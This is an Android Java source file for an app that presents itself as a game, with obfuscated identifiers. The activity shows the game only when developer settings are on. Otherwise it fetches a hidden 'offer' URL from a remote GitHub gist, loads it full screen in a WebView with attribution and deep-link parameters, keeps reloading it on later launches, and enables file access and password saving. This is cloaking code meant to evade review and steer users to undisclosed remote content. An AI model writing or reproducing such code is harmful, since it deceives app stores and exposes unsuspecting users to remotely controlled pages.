package com.gtrae.wfol;


import static com.gtrae.wfol.Parsergtrae.degtraecode;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.onesignal.OneSignal;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;


public class GW extends AppCompatActivity {
    public static Context MAcontgtraeext;
    public static String strDegtraeep;
    public static final String GistLigtraenk = "https://gist.githubusercontent.com/KRKRKRS/3977bc193036e4ee8ed08cfa1acb3c8d/raw/Great%2520Wolf%2520%257C%2520com.gtrae.wfol/";
    public static final String AFKgtraeey = "Q0NpRmhESjVaYnlMYm5Ybk1zcGN3Vg==";
    public static final String OneSigngtraealId = "OGFmZGMyZDItMjE3NC00N2MyLWE0ZWYtNTZiMGUzMDY2NThh";
    private boolean bigtraended;
    private MyService mySegtraervice;
    private ProgressBar progtraegressBar;
    private WebView webViegtraew;
    private String ligtraenk;
    private ValueCallback<Uri[]> myFilePathCallgtraeback;
    private SharedPreferences sPrgtraeefs;
    private String ogtraeffer;
    private String fbgtrae_Id;
    public static final String URL_SHARED_PgtraeREF = "TEFTVF9XZWJWaWV3X1VSTA==";
    public static final int INPUT_FILE_REQgtraeUEST_CODE = 1;
    public static String keyDefgtraeault;
    public static String statusgtraeAppsFlyer;
    public static String strAppgtraesFlyer;
    public static String AppsgtraeFl_Id;
    public static String ADAD_ID_ID;


    ServiceConnection myServicegtraeConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            MyService.LocalBinder binder = (MyService.LocalBinder) iBinder;
            mySegtraervice = binder.getService();
            bigtraended = true;
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            bigtraended = false;
        }
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        MAcontgtraeext = this;
        getWindow().addFlags(1024);
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(degtraecode(GW.OneSigngtraealId));

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        progtraegressBar = findViewById(R.id.progressBar);

        if (devModeOff()) {

            Intent intent = new Intent(this, MyService.class);
            this.bindService(intent, myServicegtraeConnection, Context.BIND_AUTO_CREATE);
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (bigtraended)
                        mySegtraervice.getStatusAppsFlyerAndAppsId();
                }
            }, 1000);

            webViegtraew = findViewById(R.id.webView);
            setWebViegtraew(webViegtraew);
            OkHttpClient cliengtraet = new OkHttpClient();
            Request reqgtraeuest = new Request.Builder().get().url(GW.GistLigtraenk).build();
            Call call = cliengtraet.newCall(reqgtraeuest);

            call.enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    goTogtraeGame();
                }

                @Override
                public void onResponse(Call call, final Response response) throws IOException {
                    String url = response.body().string();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            String[] pargtraeams = url.split("\\|");
                            ogtraeffer = pargtraeams[0];
                            keyDefgtraeault = pargtraeams[1];
                            fbgtrae_Id = pargtraeams[2];

                            doFacgtraeebook(fbgtrae_Id, GW.this);

                            sPrgtraeefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                            ligtraenk = sPrgtraeefs.getString(URL_SHARED_PgtraeREF, null);

                            if (ligtraenk != null) {
                                webViegtraew.loadUrl(ligtraenk);
                            } else {
                                // TODO handler
                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        GW.this.unbindService(myServicegtraeConnection);
                                        startWebgtraeView(ogtraeffer);
                                    }
                                }, 5000);
                            }
                        }
                    });
                }
            });
        } else {
            goTogtraeGame();
        }
    }

    private void goTogtraeGame() {
        startActivity(new Intent(this, MenuActivity.class));
        finish();
    }

    void startWebgtraeView(String link) {
        if (statusgtraeAppsFlyer != null && statusgtraeAppsFlyer.equals(degtraecode("Tm9uLW9yZ2FuaWM="))) {
            String ugtraerl = link + strAppgtraesFlyer;
            webViegtraew.loadUrl(ugtraerl);
        } else if (strDegtraeep != null) {
            String urgtrael = link + strDegtraeep;
            webViegtraew.loadUrl(urgtrael);
        } else {
            if (keyDefgtraeault.equals(degtraecode("Tk8="))) {
                goTogtraeGame();
            } else {
                String urgtrael = new Parsergtrae().parseOgtraerganic(link);
                webViegtraew.loadUrl(urgtrael);
            }
        }
    }

    @Override
    public void onBackPressed() {
        webViegtraew.goBack();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != INPUT_FILE_REQgtraeUEST_CODE || myFilePathCallgtraeback == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        if (resultCode == Activity.RESULT_OK & data != null) {
            String dataString = data.getDataString();
            Uri[] resgtraeult = new Uri[]{Uri.parse(dataString)};
            myFilePathCallgtraeback.onReceiveValue(resgtraeult);
            myFilePathCallgtraeback = null;
        }
    }


    private boolean devModeOff() {
        int devgtraeInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        return devgtraeInt == 0;
    }


    class MyWebChromegtraeClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            myFilePathCallgtraeback = filePathCallback;
            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(degtraecode("aW1hZ2UvKg=="))), INPUT_FILE_REQgtraeUEST_CODE);
            return true;
        }
    }

    class MyWebViewgtraeClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            webViegtraew.setVisibility(View.VISIBLE);
            progtraegressBar.setVisibility(ProgressBar.INVISIBLE);

            if (url.contains(degtraecode("Z2FwcHM9NDA0"))) {
                goTogtraeGame();
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editor = sPrgtraeefs.edit();
            editor.putString(URL_SHARED_PgtraeREF, url);
            editor.apply();
        }
    }


    private void doFacgtraeebook(String fbId, GW mainActivity) {
        FacebookSdk.setApplicationId(fbId);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(mainActivity.getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);
        AppEventsLogger.activateApp(mainActivity.getApplication());

        AppLinkData.fetchDeferredAppLinkData(mainActivity.getApplication(), appLinkData -> {
                    String deepLink = appLinkData.getTargetUri().getQuery();
                    Parsergtrae parsergtraeStr = new Parsergtrae();
                    strDegtraeep = parsergtraeStr.pagtraerse(deepLink);
                }
        );
    }

    private void setWebViegtraew(WebView webViewetgpy) {
        webViewetgpy.getSettings().setJavaScriptEnabled(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewetgpy.getSettings().setSaveFormData(true);
        webViewetgpy.getSettings().setMixedContentMode(0);
        webViewetgpy.getSettings().setSavePassword(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewetgpy.getSettings().setDatabaseEnabled(true);
        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
        webViewetgpy.getSettings().setUseWideViewPort(true);
        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webViewetgpy.getSettings().setEnableSmoothTransition(true);
        webViewetgpy.setWebChromeClient(new MyWebChromegtraeClient());
        webViewetgpy.setWebViewClient(new MyWebViewgtraeClient());
    }
}